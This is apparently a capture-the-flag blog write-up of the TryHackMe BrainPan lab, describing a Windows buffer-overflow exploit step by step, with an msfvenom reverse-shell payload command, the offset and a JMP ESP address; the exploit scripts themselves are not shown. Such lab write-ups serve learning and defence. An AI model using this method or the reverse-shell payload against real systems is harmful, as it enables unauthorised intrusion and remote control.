---
title: "BrainPan-Tryhackme"
author: "Trevor saudi"
date: 2021-04-05T18:46:03.757Z
lastmod: 2022-05-24T14:31:47+03:00

description: ""

subtitle: "Exploit a buffer overflow vulnerability by analyzing a Windows executable."

image: "/posts/2021-04-05_brainpantryhackme/images/1.png" 
images:
 - "/posts/2021-04-05_brainpantryhackme/images/1.png"
 - "/posts/2021-04-05_brainpantryhackme/images/2.png"
 - "/posts/2021-04-05_brainpantryhackme/images/3.png"
 - "/posts/2021-04-05_brainpantryhackme/images/4.png"
 - "/posts/2021-04-05_brainpantryhackme/images/5.png"
 - "/posts/2021-04-05_brainpantryhackme/images/6.png"
 - "/posts/2021-04-05_brainpantryhackme/images/7.png"
 - "/posts/2021-04-05_brainpantryhackme/images/8.png"
 - "/posts/2021-04-05_brainpantryhackme/images/9.png"
 - "/posts/2021-04-05_brainpantryhackme/images/10.png"
 - "/posts/2021-04-05_brainpantryhackme/images/11.png"
 - "/posts/2021-04-05_brainpantryhackme/images/12.png"
 - "/posts/2021-04-05_brainpantryhackme/images/13.png"
 - "/posts/2021-04-05_brainpantryhackme/images/14.png"
 - "/posts/2021-04-05_brainpantryhackme/images/15.png"
 - "/posts/2021-04-05_brainpantryhackme/images/16.png"
 - "/posts/2021-04-05_brainpantryhackme/images/17.png"
 - "/posts/2021-04-05_brainpantryhackme/images/18.png"
 - "/posts/2021-04-05_brainpantryhackme/images/19.png"


aliases:
    - "/brainpan-tryhackme-ced123611c56"

---

![image](/posts/2021-04-05_brainpantryhackme/images/1.png#layoutTextWidth)


Exploit a buffer overflow vulnerability by analyzing a Windows executable.

**Enumeration**

Perform a quick rustscan to view open ports.

![image](/posts/2021-04-05_brainpantryhackme/images/2.png#layoutTextWidth)


Port our results to nmap.

![image](/posts/2021-04-05_brainpantryhackme/images/3.png#layoutTextWidth)


Not much information but I tried opening them on my browser. Port 9999 gave nothing but 10000 opens up a website as shown below.

![image](/posts/2021-04-05_brainpantryhackme/images/4.png#layoutTextWidth)


I bruteforced for some directories and found something interesting.

![image](/posts/2021-04-05_brainpantryhackme/images/5.png#layoutTextWidth)


This directory contains an executable file which is the application running on port 9999.

![image](/posts/2021-04-05_brainpantryhackme/images/6.png#layoutTextWidth)


Trying a netcat to port 9999. We get this password prompt.

![image](/posts/2021-04-05_brainpantryhackme/images/7.png#layoutTextWidth)


**Fuzzing**

We are working with a buffer overflow, so let us trying crashing the application running on port 9999

![image](/posts/2021-04-05_brainpantryhackme/images/8.png#layoutTextWidth)


We indeed get a crashing confirming existence of a buffer overflow.

Download the executable file and transfer it to your Windows VM. We will work with Immunity debugger.

Run the application and try connecting to it using our VM’s IP.

![image](/posts/2021-04-05_brainpantryhackme/images/9.png#layoutTextWidth)


We can test the connection using netcat. We get the connection back. Everything set up, let’s get hacking :)

![image](/posts/2021-04-05_brainpantryhackme/images/10.png#layoutTextWidth)


**Step 1: Finding the size of the crash**

We need to find the approximate number of bytes that crashed our application. Attach it to immunity debugger and we can write a python script to send some bytes to the application till it crashes.




Head over to immunity debugger and see that our application crashed

![image](/posts/2021-04-05_brainpantryhackme/images/11.png#layoutTextWidth)


To calculate the size of the crash, right click on esp , follow in dump. Check the address where the As start and end

![image](/posts/2021-04-05_brainpantryhackme/images/12.png#layoutTextWidth)


We get 2072. We will use this as the default length of bytes.

Modify our script as follows.




**Step 2: Finding the offset**

Next we need to find out the exact number of bytes within the total_length that actually cause the crash. We use msf pattern create and pattern offset.
`/usr/bin/msf-pattern_create -l 2072`

Copy the result and modify our script as follows




Run the script and note the value of the EIP
`/usr/bin/msf-pattern_offset -l 2072 -q 35724134                         
[*] Exact match at offset 524`

We get our offset at 524. This means we have exactly 524 bytes before we reach the EIP register

**Step 3: Controlling the EIP**

We modify our script as follows and observe the EIP register




We try controlling the EIP with 4Bs and get the ascii value for B as 42424242 on the EIP register.

![image](/posts/2021-04-05_brainpantryhackme/images/13.png#layoutTextWidth)


We have control over the EIP.

**Step 4: Finding the bad characters**

We need to determine the characters that brainpan does not like. This will help us create our payload without the bad characters.

I like to use the struct inbuilt module with list comprehension. Modify your script as follows and send the bad characters.




We can observe the characters in the hex dump and see if we get any bad ones. Luckily for us there are no bad characters here.

![image](/posts/2021-04-05_brainpantryhackme/images/14.png#layoutTextWidth)


**Step 5: Finding a JMP ESP instruction**

We need to find a JMP ESP instruction that will take us to the top of the stack. We will use this JMP ESP as the new EIP so that we hijack the control flow of the program.

We can use the mona module
`!mona jmp -r esp `

We get an address that points to a jmp esp instruction

![image](/posts/2021-04-05_brainpantryhackme/images/15.png#layoutTextWidth)
`0x311712F3`

Set a breakpoint at that instruction. Ctrl+G , enter the address value then press enter and set breakpoint.

![image](/posts/2021-04-05_brainpantryhackme/images/16.png#layoutTextWidth)


Modify our script as follows and observe that we hit the breakpoint,




step through the code using f7 and observe how we get redirected to the top of the stack

![image](/posts/2021-04-05_brainpantryhackme/images/17.png#layoutTextWidth)


**Step 6: Generating shellcode**

Now we can generate shellcode to get a reverse shell on our program
`msfvenom -p windows/shell_reverse_tcp LHOST=wlan0 LPORT=4444 -e x86/shikata_ga_nai -f py -b &#34;\x00&#34;`

Modify our script and send the payload while listening on port 4444

![image](/posts/2021-04-05_brainpantryhackme/images/18.png#layoutTextWidth)


Sweet :) Our exploit worked. Now recreate the shellcode but with tun0 for tryhackme local IP. Change the IP in the script to the remote IP




We get a shell :)

![image](/posts/2021-04-05_brainpantryhackme/images/19.png#layoutTextWidth)


Happy hacking :)
